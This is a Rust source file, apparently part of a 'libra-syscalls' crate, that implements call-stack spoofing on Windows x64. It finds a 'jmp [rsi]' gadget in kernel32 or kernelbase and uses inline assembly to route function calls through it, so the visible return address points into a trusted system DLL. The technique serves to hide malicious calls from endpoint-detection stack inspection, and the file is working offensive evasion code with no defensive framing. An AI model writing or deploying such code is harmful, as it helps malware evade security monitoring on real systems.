//!
//!

use core::sync::atomic::{AtomicU64, Ordering};

use crate::ffi::{wide, GetModuleHandleW};
use crate::pe::PeImage;

/// `jmp qword ptr [rsi]`
const GADGET_PATTERN: [u8; 2] = [0xFF, 0x26];

#[used]
#[no_mangle]
pub static LIBRA_SPOOF_GADGET: AtomicU64 = AtomicU64::new(0);

#[repr(C)]
pub struct SpoofFrame {
    pub trampoline: usize,
    pub function: usize,
    pub saved_rsi: usize,
}

extern "C" {
    fn libra_spoof(
        a: usize,
        b: usize,
        c: usize,
        d: usize,
        frame: usize,
        pad: usize,
        e: usize,
        f: usize,
        g: usize,
        h: usize,
    ) -> usize;
}

core::arch::global_asm!(
    r#"
    .p2align 4
    .globl libra_spoof
libra_spoof:
    pop r11
    add rsp, 8
    mov rax, qword ptr [rsp + 24]
    mov r10, qword ptr [rax]
    mov qword ptr [rsp], r10
    mov r10, qword ptr [rax + 8]
    mov qword ptr [rax + 8], r11
    mov qword ptr [rax + 16], rsi
    lea rsi, [rip + libra_spoof_fixup]
    mov qword ptr [rax], rsi
    mov rsi, rax
    jmp r10
libra_spoof_fixup:
    sub rsp, 16
    mov rcx, rsi
    mov rsi, qword ptr [rcx + 16]
    jmp qword ptr [rcx + 8]
"#
);

pub fn init_spoof() -> Result<(), &'static str> {
    let gadget = find_gadget().ok_or("no jmp [rsi] gadget in kernel32/kernelbase")?;
    LIBRA_SPOOF_GADGET.store(gadget as u64, Ordering::Relaxed);
    Ok(())
}

fn find_gadget() -> Option<usize> {
    for name in ["kernel32.dll", "kernelbase.dll"] {
        let base = unsafe { GetModuleHandleW(wide(name).as_ptr()) as usize };
        if base == 0 {
            continue;
        }
        if let Some(img) = unsafe { PeImage::parse(base) } {
            if let Some(g) = unsafe { img.scan_executable(&GADGET_PATTERN) } {
                return Some(g);
            }
        }
    }
    None
}

///
///
/// # Safety
#[inline(always)]
pub unsafe fn spoof_call(
    target: usize,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
) -> usize {
    let gadget = LIBRA_SPOOF_GADGET.load(Ordering::Relaxed) as usize;
    assert!(
        gadget != 0,
        "libra-syscalls: spoof gadget not initialized (call init first)"
    );

    let mut frame = SpoofFrame {
        trampoline: gadget,
        function: target,
        saved_rsi: 0,
    };
    libra_spoof(
        a1,
        a2,
        a3,
        a4,
        &mut frame as *mut SpoofFrame as usize,
        0,
        a5,
        a6,
        a7,
        a8,
    )
}
